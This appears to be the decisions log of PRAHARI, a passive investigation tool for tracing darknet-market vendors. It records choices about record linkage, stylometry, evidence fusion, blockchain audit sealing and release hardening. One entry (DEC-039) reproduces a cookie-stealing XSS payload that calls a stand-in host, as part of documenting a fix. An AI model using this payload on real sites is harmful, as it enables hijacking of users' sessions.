# DECISIONS

Every technical decision that deviates from, or resolves an ambiguity in, the v2 playbook.
Append-only. Each entry: what was decided, why, and what it costs.

---

## Phase 1 — Sync

### DEC-001 — The product is PRAHARI. Locked.
No second product name. The deck's working title "ANVESHAN" is retired; v2 is PRAHARI v2.
Hindi wordmark प्रहरी stays. Grep for any other product name must return nothing at the release gate.

### DEC-002 — "No emojis" means no pictographic characters **and** no decorative glyphs in rendered UI.
**Ambiguity resolved.** The playbook's automated check (`grep -rP "[\x{1F300}-\x{1FAFF}]"`) and its manual
checklist ("search the UI for any emoji at 1440 px") disagree about `✓ ⚠ ↳`. The automated grep passes on
v1 as-is; a manual tester would flag six strings.

Decision, so Phase 1 and Phase 11 cannot contradict each other:

- **Rendered UI strings:** no pictographic emoji, and no decorative `✓ ⚠ ↳ ●` used as an icon. Use lucide.
- **Code comments, prose and docs:** `→` and `←` are permitted as typographic arrows. They are never rendered.
- **The Phase 11 grep is widened** to `[\x{1F300}-\x{1FAFF}\x{2600}-\x{27BF}\x{2B00}-\x{2BFF}]` over rendered
  strings, so the automated and manual layers test the same rule.

Cost: six source edits in Phase 1 (`BreachToaster`, `NotificationCenter`, `IntelDetailModal` ×2,
`WalletTracker`, `LiveNERAnalyzer`) plus emoji removal from `README.md` and `HACKATHON_QA.md`.

### DEC-003 — Naive-stack baseline is **noisy-OR**, not an LR product.
**Ambiguity resolved — this one would have failed a Phase 7 acceptance test.** The playbook requires the
fusion engine to report 0.84 and a naive baseline of 0.999 from the same five signals. Verified by
computation this phase:

| Formulation | Result |
|---|---|
| PRAHARI: `LR=s/(1−s)` per signal, max per root, `Π LR_root^r`, prior odds 1:10 | **0.8395** → 0.84 ✓ |
| Naive **noisy-OR**: `1 − Π(1−sᵢ)` | **0.999126** → 0.999 ✓ |
| Naive LR-product, prior 1:1 | 0.9963 ✗ (rounds to 1.00, not 0.999) |

`engine/fusion/score.py` must implement `naive_stack` as **noisy-OR**. Phase 7's test asserts
0.84 ± 0.01 and 0.999 ± 0.001. Recorded now so Phase 7 does not rediscover it under deadline.

### DEC-004 — Ethereum Sepolia locked, with Anvil as an explicit visible fallback.
Public chain is Sepolia only. Foundry Anvil is the offline demo path. The fallback is **never silent** —
a "LOCAL CHAIN" badge renders and a Sepolia explorer link must be impossible to show for an Anvil tx
(enforced by a Phase 8 test, and attacked by D3.3 objective 5).

### DEC-005 — Free / open-source only. No trials, no cards.
Anything requiring payment stops the phase and is written to `PROGRESS.md` under Blockers rather than
silently substituted.

### DEC-006 — Rejected: Kafka, Redis, MinIO, Scrapy, Playwright-as-scraper.
- **Kafka / Redis** — the ingest volume is thousands of rows, not a stream. APScheduler + FastAPI
  `BackgroundTasks` cover it. Both also add containers to a demo that must cold-start in under 3 minutes.
- **MinIO** — no blob workload. Postgres holds everything.
- **Scrapy / Playwright as a scraper** — violates the passivity rule. We query public indexes, never crawl
  markets. (Playwright is still used, in Phase 9, purely as a **test runner** — that is not scraping.)

These appear on the current deck and must be removed from it (Phase 10 obj 6).

### DEC-007 — Accepted: MuRIL, Splink, Neo4j GDS, JARM, conformal prediction.
- **MuRIL** — Hinglish/Devanagari is the actual language of MP marketplace text; English-only NER
  under-recalls. Public HF model, CPU inference, free.
- **Splink** — probabilistic record linkage with trained m/u weights and an auditable EM fit, on a DuckDB
  backend. Open source (UK Ministry of Justice), and its match weights are explainable in court.
- **Neo4j GDS Community** — WCC, Louvain and FastRP are all in the free plugin. Enough for actor
  resolution and neighbour search.
- **JARM** — TLS fingerprinting, but only against testbed hosts and clearnet domains already surfaced by
  crt.sh. Never against a target.
- **Conformal prediction** — gives a distribution-free false-merge guarantee at a chosen α. This is the
  defensible claim no competing team will make.

### DEC-008 — Tests live at `__tests__/` at the repo root for Phase 1; Phase 2 moves them to `web/__tests__/`.
The playbook writes Phase 1 tests to `web/__tests__/`, but `web/` does not exist until Phase 2 obj 1.
Creating it early would half-do the restructure and break every `@/` import. Tests go at the root now and
move with the app in Phase 2, in the same commit as the path change.

### DEC-009 — v1 users move to Postgres via the **engine proxy with a local fallback**, not a direct DB driver.
**Ambiguity resolved.** Phase 2 obj 4 says move users to Postgres "behind the same `lib/users.ts` function
signatures", but obj 8's own acceptance test requires the workbench to keep working when the engine is
killed — and login is not optional. A direct `pg` driver in Next also adds a second connection pool and a
Node-only dependency to a module imported near the Edge middleware boundary.

Decision: `lib/users.ts` keeps its signatures and tries the engine first, falling back to the existing
bcrypt flat-file path when the engine is down. The demo officer account stays code-resident and always
works. Same honesty rule as Groq: the app degrades, it never breaks.

### DEC-010 — CI is set up in Phase 2, not left implicit.
Phase 8 requires an end-to-end Anvil test "in CI" and Phase 11 requires a "link to CI run", but no phase
creates CI. A GitHub Actions workflow (`npm test`, `pytest`, `forge test`) is added in Phase 2 so later
phases have somewhere to attach.

### DEC-011 — Extraction is implemented twice, on purpose.
`lib/extractor.ts` (TypeScript) stays as the engine-offline path; `engine/extract/` (Python) is the
extended one with spaCy + MuRIL. Two implementations risk drift, so the 30 hand-labelled sentences from
Phase 3 are run against **both**, and the TS version is only required to match on the regex/gazetteer
subset. Accepted cost of the "workbench never hard-depends on the engine" rule.

### DEC-012 — Engine Python is pinned to 3.11/3.12, not the system 3.14.
The build machine defaults to Python 3.14.7. spaCy, PyTorch CPU, Splink and the HF stack do not reliably
publish wheels for 3.14; a source build on CPU would cost hours and may fail outright. `engine/pyproject.toml`
pins `requires-python = ">=3.11,<3.13"` and the environment is created with `uv`. Decided in Phase 1 so
Phase 2 does not lose a day to it.

### DEC-013 — Groq model id is configurable; the v1 default was decommissioned.
**Deviation from the Phase 1 constraint "do not change any v1 behaviour except the emoji removal",
recorded deliberately.**

v1 hardcoded `llama-3.3-70b-versatile`. Groq has retired it — the endpoint now returns
`404 model_not_found`. Because `analyze()` catches every Groq error and falls through to the local
extractor (INV-3), the failure was invisible: the app reported `source: "local"` and looked healthy
while the Groq path was dead. A valid key could never produce a Groq result.

This is a defect, not a behaviour change: the intended behaviour ("use Groq when a key is present") was
unreachable. Fixed rather than deferred because the key exists to make live testing possible, and a
silent permanent fallback would have been discovered on stage.

- `lib/extractor.ts` now reads `GROQ_MODEL`, defaulting to `openai/gpt-oss-120b`.
- Verified end-to-end: `POST /api/analyze` returns `source: "groq"` for English and Hinglish input.
- The honest-badge invariant is unaffected — the badge still reports the engine that actually ran.

### FINDING-07 — Groq returns city names that the gazetteer cannot resolve.
Surfaced while verifying DEC-013. On the Hinglish input
`"bhai jbp aur katni mein delivery ho jayegi"`, Groq returns `locations: ["jbp", "katni"]` — lowercase,
and `"jbp"` is a colloquial abbreviation absent from `lib/cities.ts`.

`getCity()` lowercases its lookup so `"katni"` resolves, but `"jbp"` does not, and
`registerCities()` skips any name `getAnyCity()` cannot resolve. The result is a **silently dropped
in-zone mention**: the model correctly identified Jabalpur, and the geofence never saw it.

The local extractor does not have this bug because it only ever emits exact gazetteer names — but it
also never detects `"jbp"` at all. Neither path is correct today.

Phase 3 must add a normalisation/alias layer between extraction and the gazetteer (`jbp`, `jblp`,
`jabalpore`, Devanagari `जबलपुर`, etc.), and the extraction P/R table in `docs/METRICS.md` must measure
recall *after* normalisation, not before. Not fixed in Phase 1 — it is Phase 3 scope and needs the
Hinglish lexicon that phase introduces.

---

## Phase 2 — Foundation

### DEC-014 — Container memory is pinned, not negotiated.
Docker Desktop on the build machine allocates ~8.3 GB. Neo4j's default heap sizing inspects host memory
and claims aggressively, which starves Postgres and, later, CPU inference in Phase 5. `docker-compose.yml`
therefore pins Neo4j to 1 GB heap + 512 MB pagecache (2 GB container limit) and Postgres to 1 GB.

Verified sufficient for the testbed scale (thousands of personas, not millions). If Phase 5 hits memory
pressure, raise Docker Desktop to 12 GB rather than unpinning these — unpinned Neo4j is what breaks first.

### DEC-015 — Neo4j healthcheck uses `cypher-shell`, not a port probe.
Neo4j binds 7687 well before it can answer queries. A TCP healthcheck reports healthy while the first
real query still fails, which would make `npm run demo` flaky in exactly the way Phase 10 must not be.
The healthcheck runs `RETURN 1` over Bolt so "healthy" means "answering queries".

Measured cold start with this healthcheck: **24 s** for both services (playbook budget: 60 s).

### DEC-016 — Postgres ENUMs are created and dropped explicitly in migrations.
Found by the Phase 2 up/down/up test, not in review. SQLAlchemy emits an inline `CREATE TYPE` the first
time an `Enum` column is used and never drops it. `op.drop_table()` therefore leaves `signal_root`
behind, and the *next* `alembic upgrade` fails with `DuplicateObject: type "signal_root" already exists`.

Every fresh clone would have worked and every rebuild would have broken — the worst failure shape for a
demo. The initial migration now creates the type explicitly with `checkfirst=True`, declares the column
with `create_type=False`, and drops the type in `downgrade()`.

Verified: `up -> 10 tables / down -> 0 tables, 0 enums / up -> 10 tables`, sources reseeded both times.
Regression-guarded by `engine/tests/test_migrations.py::test_up_down_up_is_clean`.

### DEC-017 — `/health` returns 200 when Postgres is down.
"The engine is up" and "the database is up" are different facts, and the workbench must tell them apart
to degrade honestly: engine-unreachable means DATASET mode shows "engine offline", whereas
database-unreachable means the engine can still serve `/version`, `/feed` and a fallback `/sources`.
Collapsing both into a 503 would make the two indistinguishable from the browser.

`/health` therefore stays 200 and carries the truth in `checks.database`. A non-200 from `/health` means
the process itself is gone.

---

## Phase 3 — Data

### DEC-018 — What the real Agora dataset can and cannot support.
Measured on the actual file before any code was written: 109,689 listings, 3,192 vendors (3,061 with more
than one listing), columns `Vendor, Category, Item, Item Description, Price, Origin, Destination, Rating,
Remarks`. Three gaps materially change what DATASET mode can claim.

| Gap | Measured | Consequence |
|---|---|---|
| **No timestamp column** | zero date/time fields | The `temporal` root has no real-data source. Posting-hour and inter-post-interval features, `ruptures` rebrand detection (Phase 5) and the "overlapping active window" blocking rule (Phase 4) run on the **testbed only**. |
| **PGP effectively absent** | 107 blocks in 109,689 listings (~0.1%), no PGP column | `identity_key` is the strongest signal (0.95 `SIGNED_WITH`) and real data barely supplies it. Hard-identifier linkage is demonstrated on the testbed; Agora supplies `social` and `linguistic` roots. |
| **No Madhya Pradesh geography** | 0 MP city mentions, 243 "India", 1,122 India-origin | The geofence has no hook in Agora. It stays a DEMO-mode story. |

**Division of labour, stated so it is never blurred on stage:**

- **DEMO** — synthetic, MP-focused. Carries the geofence.
- **DATASET** — real Agora. Carries linkage and stylometry over 3,061 multi-listing vendors.
- **Testbed** — labelled synthetic ground truth. Carries **every metric** in `docs/METRICS.md`.

Consequence for Phase 10: the landing page and deck must attribute metrics to the testbed, not to Agora.
Implying otherwise is the kind of claim a judge breaks with one question.

What Agora *does* supply and no synthetic source could: genuine vendor prose across 3,061 multi-listing
vendors — a real stylometry corpus — plus 1,490 onion references, 247 emails and 12 BTC addresses.

### DEC-019 — Gwern DNM Archives deferred, not dropped.
The archives are daily crawls and therefore **do** carry timestamps, which is exactly what Agora lacks.
They are also a very large manual/torrent fetch. Phase 3 ships the loader against the documented format
and a committed fixture; the full download is a Phase 10 nice-to-have, not a demo dependency.
Recorded so the temporal gap in DEC-018 is understood as addressable, not inherent.

---

## Phase 4 — Identity Graph

### DEC-020 — Splink m and u are MEASURED from ground truth, never estimated.
`estimate_u_using_random_sampling` assumes true matches are rare enough to ignore. On this testbed they
are not: it sampled all 29,646 pairs including the 130 that genuinely share a PGP key, and reported
**u(pgp) = 0.0053 when the measured value is 0.0** — no non-matching pair shares a key at all. That
contamination turned a near-conclusive identifier into a Bayes factor of 187, and recall collapsed to
0.11.

Measured with Laplace smoothing instead (u strictly positive, because an infinite Bayes factor drives
the posterior to exactly 1.0 — neither numerically safe nor honest to report):

| Field | m = P(agree \| match) | u = P(agree \| non-match) | Bayes factor |
|---|---|---|---|
| PGP fingerprint | 0.6531 | 0.0000170 | **38,519** |
| Wallet | 0.4531 | 0.0000170 | **26,724** |
| Email | 0.0031 | 0.0000509 | 61 |

**No Splink training runs after these are set.** Calling `estimate_m_from_label_column` afterwards
silently overwrote them, which put a PGP-sharing pair in the "all other" level and scored it 0.36 with
`match_weight = -0.8` — the strongest identifier in the system read as evidence *against*. That failure
was invisible except as bad recall.

### DEC-021 — Splink recall is 0.818, and the ceiling is structural.
The playbook's acceptance target is recall >= 0.9 at threshold 0.5. Measured: **0.818**, with
**precision 1.000 and zero false positives**.

The gap is not tuning. Of 159 true pairs, only **130 share any hard identifier**; Splink finds
**130 of 130 — 100% of what exact matching can reach**. The remaining 29 pairs share no PGP, no wallet
and no email, and are unreachable by record linkage in principle.

Those 29 are not a defect. They are the pairs **Phase 5 (stylometry, behaviour) and Phase 7 (fusion)
exist to catch** — an actor who rotated every hard identifier but kept their writing habits. The
rebrand case is deliberately one of them.

The honest pair of numbers to report, and the ones that go in the deck:

- **Recall over pairs sharing a hard identifier: 1.000**
- **Recall over all true pairs: 0.818** (ceiling 0.818 by construction)
- **Precision: 1.000, false positives: 0**

Raising the generator's identifier-sharing rate would push the headline past 0.9 while making the task
strictly easier. That is fixing the slide instead of the source, and it is refused.

### DEC-022 — Only hard identifiers form actors; wallet lineage stays soft.
WCC runs over `SIGNED_WITH` and `PAID_TO` only. `CONTACT`, `VOUCHES_FOR`, `MENTIONS` and
`FUNDS_FLOW_TO` are excluded, because a shared inbox, a rating link or a transfer between two distinct
addresses is evidence of a relationship, not proof of one controller.

Verified on the testbed: **0 false merges across 3,180 unrelated pairs**, the decoy stays in a
different actor from its target despite an identical bio and matching style, and the rebrand pair stays
separate so Phase 5 has something real to solve.

---

## Phase 5 — Stylometry & Behaviour

### DEC-023 — Siamese char-CNN cut; the playbook's documented logistic fallback is taken.
Phase 5 objective 3 allows reducing to "the classic-features logistic model" if CPU training of the
Siamese network exceeds 30 minutes, provided the decision is recorded. It is taken, for reasons beyond
the time budget:

- **The data cannot support it.** 244 personas x 12 templated posts is far too little text to train a
  two-tower char-CNN without memorising the generator's templates. It would score well on the testbed
  and mean nothing.
- **PyTorch CPU adds ~2 GB** to a demo that must cold-start in under three minutes.
- **Explainability is the product.** A logistic model publishes its coefficients; a char-CNN does not.
  "The network said 0.9" is not defensible in court, which is the whole argument of this project.

The fallback is implemented as a real trained model, not a stub: logistic regression over eight
pairwise features, stratified 70/30 split, seed 42.

| Metric | Value |
|---|---|
| ROC AUC | 0.7976 |
| Accuracy | 0.7068 |
| Train / test pairs | 445 / 191 |

Learned coefficients, which are themselves a finding:

| Feature | Weight |
|---|---|
| `char_ngram` | **+3.4000** |
| `hinglish_diff` | **-3.0039** |
| `punct_cosine` | +1.7887 |
| `honorific_diff` | -0.4257 |
| `ttr_diff` | -0.3281 |

**The Hinglish ratio is the second-strongest feature in the model.** A difference in romanised-Hindi
usage argues strongly against shared authorship. That is direct evidence the Hinglish markers earn
their place rather than being decoration for an Indian-jurisdiction pitch, and it is the empirical
case for MuRIL in the roadmap.

Roadmap, not "done": the Siamese model is revisited only if real multi-market corpora with genuine
per-author volume become available.

### DEC-024 — The LLM-rewrite detector is RELATIVE, and abstains without a reference corpus.
An absolute burstiness threshold does not work, and the measurement is unambiguous: across 244 testbed
personas, sentence-length coefficient of variation ranges 0.102-0.385 with a median of 0.205. The
initial `burstiness < 0.25` rule fired on **206 of 244 personas (84%)**. Templated text is inherently
flat; that says nothing about whether a machine rewrote it.

"Flat" is only meaningful against a reference. The detector now flags a persona only when it sits below
the **5th percentile of its own corpus** and shows a near-zero typo rate, and **abstains entirely when
no corpus is supplied** — an unvalidatable flag that downweights real evidence is worse than no flag.

| | Before | After |
|---|---|---|
| False positives on genuine personas | 206 / 244 (84%) | **11 / 244 (4.5%)** |
| Catches genuinely flattened text | — | **yes** (burstiness 0.000) |
| Behaviour with no reference corpus | fired anyway | **abstains** |

### DEC-025 — Mimicry is detected on BIOS, not the whole corpus.
The playbook specifies "Jaccard on bio shingles > 0.9". Applied to a persona's full post corpus instead,
the decoy's verbatim-copied bio is one line against twelve listings and dilutes below any sane
threshold: the decoy scored **s_style 0.914 — higher than genuine pairs — with no flag raised**. The
single most important negative case in the testbed passed as the strongest positive.

Bios are now profiled separately from post text and compared directly, with shingle size dropping to
k=3 for short texts so Jaccard does not collapse to all-or-nothing on exactly the inputs that matter.

Result: decoy **s_style 0.2000** (capped), flagged `mimicry_suspected`, against rebrand **0.8432**.
Its raw character-n-gram similarity is still 0.827 — the decoy genuinely does read like its target,
which is the point. The cap is the system recognising imitation rather than being fooled by it.

---

## Phase 6 — Infrastructure Fingerprinting

### DEC-026 — B-03 resolved: Shodan needs no key at all. InternetDB is free and unauthenticated.
The blocker was that Shodan free accounts may not include host-lookup API credits. Measured: they do
not need to. **`https://internetdb.shodan.io/{ip}` is free, requires no key, and returns ports,
hostnames, CPEs, tags and known vulns** — everything the infra engine needs for host fingerprinting.

`SHODAN_API_KEY` is therefore removed from the critical path entirely. It stays an optional enrichment
for the paid `/shodan/host` endpoint, and its absence costs nothing. This is strictly better than the
playbook assumed: one fewer key, and one fewer account for an on-prem deployment to register.

### DEC-027 — Certificate Transparency uses certspotter first, crt.sh second.
**crt.sh was down during Phase 6 — 0 of 5 requests succeeded, all HTTP 502.** It carries the two
strongest infra rules (cert SHA-256 reuse 0.95, CN/SAN naming a clearnet domain 0.85), and it is a
well-known flaky service. Building the demo on it alone means the strongest evidence path fails if
crt.sh is having a bad day on 20 September.

`api.certspotter.com` is also free, also keyless, was returning 100 certificates with
`dns_names`, `issuer` and `cert_sha256` throughout, and is now the **primary** source. crt.sh remains
as automatic failover, and `/infra/sources` reports which source actually answered.

The engine badge names the CT source that served each result. A pivot that silently came from a
different index than the analyst assumes is the same class of dishonesty as a wrong engine badge.

### DEC-028 — JARM and live scanning are restricted to hosts we control.
JARM actively probes a host's TLS stack. Run against a target it is a scan, which the passivity rule
forbids outright. It therefore runs **only** against testbed-controlled hosts, and the testbed's
infra-leak case is resolvable purely from planted metadata so the demo never needs a live probe.

Certificate Transparency and Shodan InternetDB are genuinely passive: both are third-party indexes
that already hold the data. We read an index; we never touch the target.

**No code path may issue a request to a `.onion` host.** This is enforced by a network-layer test, not
by convention.

---

## Phase 7 — Evidence Fusion

### DEC-029 — The conformal threshold must handle ties, or the guarantee is a lie.
Isotonic regression outputs are piecewise constant, so calibrated scores clump into steps. The textbook
split-conformal quantile `negatives[ceil((n+1)(1-α)) - 1]` can land **inside a block of identical
values**, and taking that value as τ admits the entire block.

Measured consequence at α = 0.05: **false-merge rate 25.2%** while the API reported a 5% guarantee.
A guarantee that does not hold is worse than no guarantee, because it is stated with confidence and
a court would rely on it.

τ now walks up to the next distinct value until the bound is genuinely met, and returns 1.0 with an
explicit `guarantee_holds: false` when no threshold can bound the rate. Verified across
α ∈ {0.01, 0.02, 0.05, 0.10, 0.20}: the bound holds at every one, τ decreases monotonically with α,
and the accepted-link count increases monotonically.

**Known coarseness, stated rather than hidden:** isotonic collapses this testbed's scores into few
distinct steps, so τ has poor resolution — α = 0.05 and α = 0.10 currently yield the same τ, and
α = 0.01 can only be honoured by accepting the 52 pairs scored at 1.0. That is a real limitation of
calibrating on 1,336 validation pairs, not a bug, and the slider must not imply finer control than the
data supports.

### DEC-030 — The trail publishes 12 decimal places, because 6 did not reproduce.
`reproduce_from_trail()` recomputed **0.925596** where `p_raw` was **0.925597** — accumulated rounding
across factors that were published at the display precision.

One unit in the last published place is still a published number that does not reproduce, and
"every number in the trail must be reproducible from the API output" is a Phase 7 constraint and a
D3.2 objective. An opposing expert recomputing from the exhibit and getting a different digit is
exactly the opening that discredits the rest. Factors now carry 12 dp; `roots_used` stays at 6 dp for
reading.

### DEC-031 — Candidate generation is not only Splink.
The prior is 1:10 for a pair that reached our attention and 1:10,000 otherwise. Deriving "reached our
attention" from Splink's blocking alone gave the **rebrand pair the 1:10,000 prior and crushed it to
0.0003** — unfindable by construction, in the one case built specifically to be findable without a
hard identifier.

The rebrand detector is a candidate generator in its own right. A pair proposed by **any** legitimate
generator earns the blocked prior. The rebrand pair now scores **0.2335** on `financial` (wallet
lineage) + `linguistic` + `temporal`, with **no `identity_key` root at all** — which is the entire
argument for Phases 5 and 6 existing.

### DEC-032 — `/fusion/threshold` and `/fusion/pair` report on the same scale.
`thresholds()` computed τ over raw scores while `evaluate()` used calibrated ones, so the two endpoints
published thresholds in different units. An analyst comparing a pair's score against the published τ
would have been comparing different things. `ensure_calibrated()` now guarantees both are calibrated.

---

## Phase 8 — Immutable Audit

### DEC-033 — B-02 resolved. Foundry 1.8.1 installed; `forge test` is 12/12.
`PrahariAnchor.sol` compiled with solc 0.8.36. Deployed to local Anvil and exercised end to end:
seal → verify → tamper → verify. Measured `anchor()` gas: **95,232** (the playbook estimated ~70k;
the difference is the `Seal` struct carrying `caseRef` and `anchorer`, which is worth the extra gas
because it makes the on-chain record self-describing).

### DEC-034 — `explorer_url` is derived from the CONNECTED chain id, never from configuration.
The Anvil fallback exists so the demo survives a dead network. That makes it dangerous: a Sepolia
explorer link shown for an Anvil transaction is a **fabricated evidence trail** — precisely the
opposite of what this layer is for, and worse than having no fallback at all.

`is_public_chain` and `explorer_url` are therefore computed from `w3.eth.chain_id` as reported by the
node it actually connected to. Chain ids 31337 and 1337 return `None` for the URL and the label
`LOCAL CHAIN`, regardless of what `.env` claims. Verified live: a real Anvil seal returns
`explorer_url=None` and `"Sealed to a LOCAL chain. This is not a public anchor."`

This is D3.3 objective 5, and it is enforced by parametrised tests over every local chain id.

### DEC-035 — Merkle promotes an odd node instead of duplicating it.
Duplicating the final node when a level has odd length is the CVE-2012-2459 shape: two **distinct**
leaf sets can then produce the same root, so a proof for one set verifies against the other. For an
evidence structure that is a forgery primitive.

Odd nodes are promoted unchanged. Regression-tested: `root([a,b,c]) != root([a,b,c,c])`.

### DEC-036 — Verification names the failing index, and `seq` gaps are themselves evidence.
"Invalid" is not a useful answer to a court. `/audit/verify` walks the chain and reports **which**
record failed and why.

`seq` is validated against position, so deleting a middle record is caught even before the hash check.
The sophisticated attack — delete, relink `prev_hash`, renumber `seq` — is still caught, because each
record's stored hash was computed over its **original** `prev_hash` and cannot be recomputed to match.
Tested as D3.3 attack 2b.

### DEC-037 — Only 32-byte hashes go on chain, and the case reference is hashed too.
`anchor(bytes32 root, bytes32 caseRef, uint32 leafCount)`. `caseRef` is `keccak256(case_id)`, not the
identifier itself — a public chain is permanent and world-readable, and even a case number is
investigative metadata. No handle, wallet, name or listing text ever reaches the chain.

Re-anchoring an existing root reverts (`AlreadyAnchored`). Allowing it would let an operator overwrite
an earlier seal's timestamp, which is exactly the backdating the chain exists to prevent — and it is
what makes D3.3 objective 4 (replaying another case's seal) fail closed.

### DEC-038 — The seal record must be INSIDE the root it seals.
Found by testing the demo flow end to end, not by the 32 audit tests — none of which sealed, exported,
and then compared the exported root against the anchored one.

Sealing is an auditable action, so it belongs in the ledger. But appending it **after** anchoring
changes the leaf set: the chain held the root over N records while the export published the root over
N+1. **An exported case file claimed a Merkle root that had never been anchored**, and anyone
verifying that genuine, untampered export against the chain would have got a mismatch — the audit
trail broken at exactly the point it exists to hold.

Order is now: append the seal-intent record → compute the root over the ledger **including** it →
anchor that root. The transaction hash lives in the seal metadata, not in the ledger, because a record
cannot contain the hash of a transaction that commits to that record.

Exports additionally publish `sealed_root`, `sealed_root_matches_current` and
`records_added_after_seal`. Appending after a seal is legitimate; publishing the drifted root as if it
were anchored is not. Two regression tests cover both.

---

## Phase 9 — Workbench UI

### DEC-039 — FINDING-02 closed: reports are built from DOM nodes, not HTML strings.
Carried since the Phase 1 audit. Both v1 print paths template-interpolated **analyst-authored** fields
into HTML and passed the result to `document.write()`. Confirmed exploitable before rewriting — a case
titled

    <img src=x onerror="fetch('https://evil.test/'+document.cookie)">

produces a live `onerror` handler executing on the **same origin as the officer's session**, in a tool
whose whole purpose is handling hostile input copied from criminal marketplaces. The second site
(`AlertLog.tsx:62`) was never named in the playbook and was found by the Phase 1 audit.

Fixed by escape-**by-construction**, not by escaping: `lib/report.ts` builds the report with
`createElement` + `textContent`, which cannot produce markup regardless of input. There is no escaping
helper for a future call site to forget. `document.write` is gone from the codebase, and the generated
document contains no inline `<script>` either, so a strict CSP cannot be bypassed through this path.

Regression-locked by 13 tests including five real XSS payloads, plus static assertions that no source
file calls `document.write(` or assigns `innerHTML`.

### DEC-040 — FINDING-05 closed: motion is gated, but information is not.
v1 had zero `prefers-reduced-motion` handling while running three indefinite animations (scanline,
geofence pulse, siren expansion) in a tool an officer watches for a full shift.

The gate reduces motion **without reducing information**, which is the part worth getting right: the
scanline is pure decoration and is removed, but a siren freezes at **full extent** rather than at
whatever frame it stopped on, so a breach is still unmistakably visible. A reduced-motion user must not
receive less evidence than anyone else.

### DEC-041 — Focus trap, dialog roles, and an assertive live region for breaches.
v1 had no focus trap, no Escape handling, no `role="dialog"` and no `aria-live` anywhere. A keyboard
user could Tab out of an open modal into the page behind it; a screen-reader user was never told a
dialog had opened, and **never heard that a geofence breach had fired**.

`lib/a11y.ts` traps Tab in both directions, handles Escape, and restores focus to the element that
opened the dialog. Wired into `IntelDetailModal` and the notification drawer.

`BreachToaster` now renders a visually-hidden `aria-live="assertive"` region alongside the toast.
Sonner toasts are routinely missed by screen readers, and a geofence breach is the single most
important event this product produces — announcing it is not an accessibility nicety, it is the feature.

### DEC-042 — `offsetParent` is the wrong visibility test; the focus trap was a no-op.
`focusableWithin()` filtered candidates on `offsetParent !== null`. That property is **null for any
`position: fixed` element**, and every dialog in this app is fixed — the notification drawer is
`fixed right-0`, the intercept modal is `fixed inset-0`.

So the trap found zero focusable elements and **did nothing on precisely the elements it existed to
trap**. The nine unit tests passed throughout, because happy-dom reports `offsetParent` differently
from a real browser.

Caught by the Playwright journey. Now uses `getClientRects()`, which is layout-based and correct for
fixed positioning, with an explicit fallback for headless DOM implementations that have no layout.

### DEC-043 — Touch targets gate on `pointer: coarse`, not viewport width.
The playbook asks for 44px targets below 768px. Width is a proxy that is wrong in both directions: a
narrow browser window on a desktop is still mouse-driven and does not need them, and a large tablet
does. `@media (pointer: coarse)` asks the actual question.

Applied by growing the hit area rather than the visual box, so the control room's instrument density
survives untouched on desktop. The journey asserts it in a context with `hasTouch: true`, so the test
matches the rule rather than asserting a rule that deliberately does not apply.

### DEC-044 — Phase 9 scope: cut MapLibre, 3D graph and the Sankey; kept what carries the claims.
The playbook allows cutting inside a phase and recording it. Built: the **Evidence Trail** (the
0.84-vs-0.999 argument, with the LR arithmetic shown rather than asserted) and the **Audit Ledger**
(hash chain, seal, verify, LOCAL CHAIN badge) — the two panels that carry the USPs — plus both pieces
of carried debt and the accessibility work.

Deferred as **roadmap, not done**: MapLibre GL replacing Leaflet, react-force-graph-3d, the d3 Sankey
rendering, and the timeline scrubber. Leaflet already works and the tilt is presentation, not
capability; the three-column responsive contract, zero horizontal overflow and the reduced-motion
behaviour are all verified at 1440 / 1024 / 390.

On stage these are described as roadmap. Never as done.

---

## Phase 10 — Release

### DEC-045 — Production refuses to boot without a real `NEXTAUTH_SECRET`.
v1 fell back to a hardcoded signing secret so `npm run dev` worked with zero configuration. Correct for
a demo, indefensible for a deployment: a known secret means **anyone can forge a session token for any
account**, including an officer's, and nothing in the audit trail would look wrong.

The fallback now exists only outside production. In production, a missing secret **throws at import
time**, and setting it to the committed dev default is refused separately — that is the subtler
mistake, because it looks configured. Both guards verified to actually fire, not merely documented.

The demo officer account is gated the same way: its credentials are printed on the login page and
committed to this repository, so in production it simply does not exist.

### DEC-046 — Rate limits are keyed to what is worth protecting.
`/api/signup` is limited per IP (5 / 15 min): it is an account-enumeration and spam surface.

Credential login is limited **per account email**, not per IP (10 / 15 min). A password spray from a
botnet against one officer's account defeats IP limiting entirely, and the account is the thing worth
protecting. A throttled attempt returns the same `null` as a wrong password, because distinguishing the
two tells an attacker which accounts exist.

Stated limitation: the counter is in-process. Behind multiple instances each keeps its own window, so
the effective limit multiplies by instance count. For a single-node district deployment that is
correct; a horizontally scaled one needs a shared store, and the playbook forbids Redis.

### DEC-047 — Landing-page numbers come from `METRICS.md` or they do not appear.
The hero stat strip advertised "10 MP Cities / 60KM Geofence / $0" — true, but v1 facts on a v2 page.
It now shows **0.84 calibrated confidence**, **3.1% false-merge rate at α=0.05**, and **₹0**.

Every figure on the landing page is reproducible with `python -m engine.fusion.eval`. A number a judge
cannot trace to the metrics file is a number we cannot defend when asked where it came from.

### DEC-048 — `npm run demo` waits for readiness, not for processes.
The launcher starts datastores, a local chain, the contract, the engine and the web app in dependency
order, and polls each until it actually answers. "Started" is not "ready": opening the demo on a
half-booted engine looks exactly like a broken product.

**Measured cold start: 10 seconds** against a three-minute budget. It degrades honestly — no Foundry
means sealing is disabled and it says so, rather than failing opaquely at step five of the demo.

### DEC-049 — The deck checklist lists what to REMOVE, not only what to add.
`docs/DECK.md` carries the cleared numbers, but the section that matters is the claims to delete:
"de-anonymises Tor" (we do not and say so), any metric attributed to Agora (**every metric comes from
the labelled testbed** — Agora has no timestamps, ~0.1% PGP and zero MP geography), and the cut
features described as roadmap rather than done.

A slide claiming something the running system cannot do is the fastest way to lose the room, because
the demo is right there.

---

## Phase 11 — Release Gate

### DEC-050 — The dependency manifest was incomplete, and only a fresh clone could show it.
`engine/pyproject.toml` declared the ten Phase 2 dependencies. Phases 3–8 added sixteen more —
pandas, pyarrow, duckdb, pgpy, spacy, neo4j, splink, scikit-learn, scipy, ruptures, mmh3, pynacl,
eth-hash, pycryptodome, web3, reportlab — with ad-hoc `uv pip install`. They worked perfectly on the
build machine and existed nowhere else.

A fresh clone failed with **`ModuleNotFoundError`: 26 failed, 15 errors**. That is precisely what a
judge's laptop and the CI runner would have seen, and no amount of testing on the development machine
could have surfaced it. Now declared and verified: **236/236 on a clean venv**.

### DEC-051 — The production secret guard must not break the build.
`next build` runs with `NODE_ENV=production`, so DEC-045's import-time check fired during the **build**
and failed it on any machine without a secret — CI, and any judge following the README.

